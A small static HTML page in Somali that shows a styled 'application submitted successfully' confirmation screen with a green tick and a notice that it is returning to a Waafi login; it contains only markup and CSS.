<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Codsiga Gudbiyay</title>

<style>

body{
  margin:0;
  font-family:Arial, sans-serif;
  background:#f3f3f3;
  display:flex;
  justify-content:center;
}

.wrapper{
  width:100%;
  max-width:420px;
  padding:20px;
  text-align:center;
}

/* TOP SUCCESS MESSAGE */
.toast{
  background:#1f2a38;
  color:white;
  padding:15px;
  border-radius:12px;
  display:flex;
  align-items:center;
  gap:10px;
  margin-bottom:25px;
}

.toast .icon{
  background:#4cd137;
  width:28px;
  height:28px;
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
  font-weight:bold;
}

/* GREEN TICK */
.bigTick{
  width:90px;
  height:90px;
  background:#7ac943;
  border-radius:50%;
  margin:20px auto;
  display:flex;
  align-items:center;
  justify-content:center;
  color:white;
  font-size:45px;
}

/* TEXTS */
h1{
  color:#7ac943;
  font-size:26px;
  margin-bottom:15px;
}

p{
  color:#666;
  line-height:1.6;
  font-size:16px;
}

/* LOADING BOX */
.loading{
  background:#ececec;
  padding:18px;
  border-radius:12px;
  margin-top:25px;
  color:#7ac943;
  font-weight:bold;
}

/* BUTTON */
.btn{
  margin-top:20px;
  border:2px solid #ddd;
  padding:15px;
  border-radius:12px;
  color:#777;
  font-size:16px;
}

</style>
</head>

<body>

<div class="wrapper">

<!-- TOP DARK MESSAGE -->
<div class="toast">
  <div class="icon">✓</div>
  <div>🎉 Codsiga si guul leh ayaa loo gudbiyay!</div>
</div>

<!-- BIG GREEN CHECK -->
<div class="bigTick">✓</div>

<p>

</p>

<p>

</p>

<div class="loading">
Ku celinaya galitaanka Waafi 4 ilbiriqsi...
</div>

<div class="btn">
Tag Galitaanka Hadda
</div>

</div>

</html>
